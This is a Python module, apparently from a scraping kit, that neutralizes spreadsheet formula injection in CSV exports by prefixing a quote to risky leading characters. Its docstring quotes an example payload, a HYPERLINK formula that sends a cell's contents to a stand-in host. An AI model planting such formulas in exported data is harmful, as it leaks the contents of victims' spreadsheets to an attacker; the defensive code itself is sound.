"""Output neutralization for scraped values.

A business name is attacker-controlled: anyone can name a listing
`=HYPERLINK("http://evil.test?x="&A1,"Click")`. csv.writer quotes it for CSV
but does nothing about the spreadsheet, so Excel and Sheets evaluate it on
open — which is a live hole in the reference kit, confirmed against its own
output path.
"""
from __future__ import annotations

# Leading characters that start a formula, or smuggle one past a naive check
# by shifting the cell boundary.
_RISKY = ("=", "+", "-", "@", "\t", "\r", "\n")


def csv_cell(value) -> str:
    """Make a value inert in a spreadsheet.

    Prefixes a single quote, the mitigation Excel and Sheets both honour as
    "treat as text". Note this also prefixes an E.164 phone (`+1512...`),
    which is correct but visible: Excel otherwise parses `+1-512-555-0101` as
    arithmetic and renders a negative number. Exports that need clean phone
    display should use the xlsx writer, which sets the cell type instead.
    """
    s = "" if value is None else str(value)
    return "'" + s if s[:1] in _RISKY else s


def csv_row(row: dict, fields) -> dict:
    return {f: csv_cell(row.get(f, "")) for f in fields}
